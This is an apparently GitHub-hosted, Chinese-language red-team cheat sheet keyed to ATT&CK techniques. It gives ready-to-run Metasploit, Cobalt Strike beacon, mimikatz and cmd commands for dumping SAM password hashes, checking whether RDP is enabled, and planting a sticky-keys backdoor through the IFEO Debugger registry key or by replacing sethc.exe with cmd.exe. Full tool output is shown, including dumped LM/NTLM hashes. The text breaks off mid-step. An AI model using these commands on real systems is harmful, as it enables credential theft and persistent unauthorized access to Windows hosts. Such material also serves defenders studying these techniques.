<h3><a id="user-content-dumps-hashes-from-the-sam-hive-file从sam文件里面读取hash" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#dumps-hashes-from-the-sam-hive-file%E4%BB%8Esam%E6%96%87%E4%BB%B6%E9%87%8C%E9%9D%A2%E8%AF%BB%E5%8F%96hash"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Dumps hashes from the SAM Hive file（从sam文件里面读取hash）</h3>
<p>实现原理：</p>
<pre><code>The SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required. 

sam文件存放着hash，然后读取该文件进行获得凭证
</code></pre>
<h4><a id="user-content-msf下操作-1" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作</h4>
<blockquote>
<p>hashdump  （普通hash获取）</p>
<p>run hashdump</p>
<p>post/windows/gather/credentials/domain_hashdump （获取域hash）</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>meterpreter <span class="pl-k">&gt;</span> hashdump 
Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
ASPNET:1006:1dce4321e5283c3e841070331873c406:085f84e35a1bfb09ca65d008cc988cae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_ROOT-5DE52AC98B:1003:406eafe671e3ac72ddb9179ad9a2204a:4fa4e3f7ef6f5dc7e1b129caab134cbd:::
IWAM_ROOT-5DE52AC98B:1004:53aacf61b38888da87c793e8c36cb74a:14ba2ea13539973d3f0be627e43ff408:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:7490f8cea3cd28b37717a5d4be375404:::

meterpreter <span class="pl-k">&gt;</span> run hashdump (需要系统权限)

[<span class="pl-k">!</span>] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[<span class="pl-k">!</span>] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[<span class="pl-k">*</span>] Obtaining the boot key...
[<span class="pl-k">*</span>] Calculating the hboot key using SYSKEY be7ba5c5d5c67d878cd0845b2b4d1027...
[-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied.
[-] This script requires the use of a SYSTEM user context (hint: migrate into service process)


msf5 post(windows/gather/credentials/domain_hashdump) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Session has Admin privs
[-] This does not appear to be an AD Domain Controller
[<span class="pl-k">*</span>] Post module execution completed</pre></div>
<h4><a id="user-content-cs下操作-1" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作</h4>
<blockquote>
<p>hashdump</p>
<p>mimikatz !lsadump::sam</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> hashdump
[<span class="pl-k">*</span>] Tasked beacon to dump hashes
[+] host called home, sent: 63557 bytes
[+] received password hashes:
Administrator:500:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
ASPNET:1006:1dce4321e5283c3e841070331873c406:085f84e35a1bfb09ca65d008cc988cae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_ROOT-5DE52AC98B:1003:406eafe671e3ac72ddb9179ad9a2204a:4fa4e3f7ef6f5dc7e1b129caab134cbd:::
IWAM_ROOT-5DE52AC98B:1004:53aacf61b38888da87c793e8c36cb74a:14ba2ea13539973d3f0be627e43ff408:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:7490f8cea3cd28b37717a5d4be375404:::

beacon<span class="pl-k">&gt;</span> mimikatz <span class="pl-k">!</span>lsadump::sam
[<span class="pl-k">*</span>] Tasked beacon to run mimikatz<span class="pl-s"><span class="pl-pds">'</span>s !lsadump::sam command</span>
<span class="pl-s">[+] host called home, sent: 841287 bytes</span>
<span class="pl-s">[+] received output:</span>
<span class="pl-s">Domain : ROOT-5DE52AC98B</span>
<span class="pl-s">SysKey : be7ba5c5d5c67d878cd0845b2b4d1027</span>
<span class="pl-s">Local SID : S-1-5-21-1911985068-4225083820-4011728908</span>
<span class="pl-s"></span>
<span class="pl-s">SAMKey : 5dfe2beb57a9d468ed8a72c51c7334ff</span>
<span class="pl-s"></span>
<span class="pl-s">RID  : 000001f4 (500)</span>
<span class="pl-s">User : Administrator</span>
<span class="pl-s">  Hash LM  : 44efce164ab921caaad3b435b51404ee</span>
<span class="pl-s">  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4</span>
<span class="pl-s"></span>
<span class="pl-s">RID  : 000001f5 (501)</span>
<span class="pl-s">User : Guest</span>
<span class="pl-s"></span>
<span class="pl-s">RID  : 000003e9 (1001)</span>
<span class="pl-s">User : SUPPORT_388945a0</span>
<span class="pl-s">  Hash NTLM: 7490f8cea3cd28b37717a5d4be375404</span>
<span class="pl-s"></span>
<span class="pl-s">RID  : 000003eb (1003)</span>
<span class="pl-s">User : IUSR_ROOT-5DE52AC98B</span>
<span class="pl-s">  Hash LM  : 406eafe671e3ac72ddb9179ad9a2204a</span>
<span class="pl-s">  Hash NTLM: 4fa4e3f7ef6f5dc7e1b129caab134cbd</span>
<span class="pl-s"></span>
<span class="pl-s">RID  : 000003ec (1004)</span>
<span class="pl-s">User : IWAM_ROOT-5DE52AC98B</span>
<span class="pl-s">  Hash LM  : 53aacf61b38888da87c793e8c36cb74a</span>
<span class="pl-s">  Hash NTLM: 14ba2ea13539973d3f0be627e43ff408</span>
<span class="pl-s"></span>
<span class="pl-s">RID  : 000003ee (1006)</span>
<span class="pl-s">User : ASPNET</span>
<span class="pl-s">  Hash LM  : 1dce4321e5283c3e841070331873c406</span>
<span class="pl-s">  Hash NTLM: 085f84e35a1bfb09ca65d008cc988cae</span>
<span class="pl-s"></span></pre></div>
<h2><a id="user-content-query-registry注册表查询" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#query-registry%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9F%A5%E8%AF%A2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Query Registry(注册表查询)</h2>
<h3><a id="user-content-check-terminal-services检测终端服务" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#check-terminal-services%E6%A3%80%E6%B5%8B%E7%BB%88%E7%AB%AF%E6%9C%8D%E5%8A%A1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Check terminal services（检测终端服务）</h3>
<p>原理：</p>
<pre><code>Check for the current registry value for terminal services, if it's 0, then terminal services are enabled. If it's 1, then they're disabled

从注册表中的键值检测是否开启终端服务，如果是0，则为开启，为1则是关闭

</code></pre>
<h4><a id="user-content-terminalcmd下操作" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminalcmd%E4%B8%8B%E6%93%8D%E4%BD%9C"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal（cmd）下操作：</h4>
<pre><code>C:\Documents and Settings\Administrator\����&gt;reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server
    fDenyTSConnections    REG_DWORD    0x0

</code></pre>
<h4><a id="user-content-msf下操作-2" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>reg queryval -k "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" -v fDenyTSConnections</p>
<p>post/windows/gather/enum_termserv (不好用)</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>meterpreter <span class="pl-k">&gt;</span> reg queryval -k <span class="pl-s"><span class="pl-pds">"</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span class="pl-pds">"</span></span> -v fDenyTSConnections
Key: HKEY_LOCAL_MACHINE<span class="pl-cce">\S</span>YSTEM<span class="pl-cce">\C</span>urrentControlSet<span class="pl-cce">\C</span>ontrol<span class="pl-cce">\T</span>erminal Server
Name: fDenyTSConnections
Type: REG_DWORD
Data: 0

msf5 post(windows/gather/enum_termserv) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Doing enumeration <span class="pl-k">for</span> S-1-5-21-1911985068-4225083820-4011728908-500
[<span class="pl-k">*</span>] Post module execution completed</pre></div>
<h4><a id="user-content-cs下操作-2" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作</h4>
<blockquote>
<p>shell reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell reg query <span class="pl-s"><span class="pl-pds">"</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span class="pl-pds">"</span></span> /v fDenyTSConnections
[<span class="pl-k">*</span>] Tasked beacon to run: reg query <span class="pl-s"><span class="pl-pds">"</span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server<span class="pl-pds">"</span></span> /v fDenyTSConnections
[+] host called home, sent: 132 bytes
[+] received output:

HKEY_LOCAL_MACHINE<span class="pl-cce">\S</span>YSTEM<span class="pl-cce">\C</span>urrentControlSet<span class="pl-cce">\C</span>ontrol<span class="pl-cce">\T</span>erminal Server
    fDenyTSConnections    REG_DWORD    0x1
</pre></div>
<h2><a id="user-content-accessibility-features易访问特征" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#accessibility-features%E6%98%93%E8%AE%BF%E9%97%AE%E7%89%B9%E5%BE%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Accessibility Features(易访问特征)</h2>
<h3><a id="user-content-point-sethcexe-file-to-cmdexe使用sethc启动cmd" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#point-sethcexe-file-to-cmdexe%E4%BD%BF%E7%94%A8sethc%E5%90%AF%E5%8A%A8cmd"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Point sethc.exe file to cmd.exe（使用sethc启动cmd）</h3>
<p>原理：</p>
<div class="highlight highlight-source-shell"><pre>Modify the registry to point the sethc.exe file to point to cmd.exe

修改注册表使sethc指向cmd，然后五次shift后就可以调出cmd，当然你也可以使用这种方法去激活一个msf的shell
</pre></div>
<h4><a id="user-content-terminal下操作" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>REG ADD "HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ
/d "C:\windows\system32\cmd.exe" /f</p>
</blockquote>
<pre><code>C:\Documents and Settings\Administrator&gt;REG ADD "HKLM\SOFTWARE\Microsoft\Windows
 NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ
 /d "C:\windows\system32\cmd.exe" /f
操作成功完成。
</code></pre>
<h4><a id="user-content-msf下操作-3" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作</h4>
<blockquote>
<p>post/windows/manage/sticky_keys</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 post(windows/manage/sticky_keys) <span class="pl-k">&gt;</span> exploit 

[+] Session has administrative rights, proceeding.
[+] <span class="pl-s"><span class="pl-pds">'</span>Sticky keys<span class="pl-pds">'</span></span> successfully added. Launch the exploit at an RDP or UAC prompt by pressing SHIFT 5 times.
[<span class="pl-k">*</span>] Post module execution completed

</pre></div>
<h4><a id="user-content-cs下操作-3" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作</h4>
<blockquote>
<p>shell REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell REG ADD <span class="pl-s"><span class="pl-pds">"</span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe<span class="pl-pds">"</span></span> /v Debugger /t REG_SZ /d <span class="pl-s"><span class="pl-pds">"</span>C:\windows\system32\cmd.exe<span class="pl-pds">"</span></span> /f
[<span class="pl-k">*</span>] Tasked beacon to run: REG ADD <span class="pl-s"><span class="pl-pds">"</span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe<span class="pl-pds">"</span></span> /v Debugger /t REG_SZ /d <span class="pl-s"><span class="pl-pds">"</span>C:\windows\system32\cmd.exe<span class="pl-pds">"</span></span> /f
[+] host called home, sent: 187 bytes
[+] received output:
操作成功完成。
</pre></div>
<h3><a id="user-content-replace-real-sethcexe-with-a-copy-of-cmdexe用cmd的副本代替sethc" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#replace-real-sethcexe-with-a-copy-of-cmdexe%E7%94%A8cmd%E7%9A%84%E5%89%AF%E6%9C%AC%E4%BB%A3%E6%9B%BFsethc"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Replace real sethc.exe with a copy of cmd.exe(用cmd的副本代替sethc)</h3>
<p>使用takeown.exe获取系统ALC权限，然后替换</p>
<h4><a id="user-content-terminal下操作-1" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>takeown.exe C:\Windows\system32\sethc.exe</p>
<p>del C:\Windows\system32\sethc.exe</p>
<p>copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>takeown.exe C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.ex
e
错误: 无效参数/选项 - <span class="pl-s"><span class="pl-pds">'</span>C:\Windows\system32\sethc.exe<span class="pl-pds">'</span></span>。
键入 <span class="pl-s"><span class="pl-pds">"</span>TAKEOWN /?<span class="pl-pds">"</span></span> 以了解用法。

C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>del C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe

C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>copy C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\c</span>md.exe C:<span class="pl-cce">\W</span>ind
ows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe
覆盖 C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe 吗<span class="pl-k">?</span> (Yes/No/All): yes
已复制         1 个文件。
</pre></div>
<h4><a id="user-content-cs下操作-4" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell takeown.exe C:\Windows\system32\sethc.exe</p>
<p>shell del C:\Windows\system32\sethc.exe</p>
<p>shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell takeown.exe C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe
[<span class="pl-k">*</span>] Tasked beacon to run: takeown.exe C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe
[+] host called home, sent: 72 bytes
[+] received output:
错误: 无效参数/选项 - <span class="pl-s"><span class="pl-pds">'</span>C:\Windows\system32\sethc.exe<span class="pl-pds">'</span></span>。
键入 <span class="pl-s"><span class="pl-pds">"</span>TAKEOWN /?<span class="pl-pds">"</span></span> 以了解用法。

beacon<span class="pl-k">&gt;</span> shell del C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe
[<span class="pl-k">*</span>] Tasked beacon to run: del C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\s</span>ethc.exe
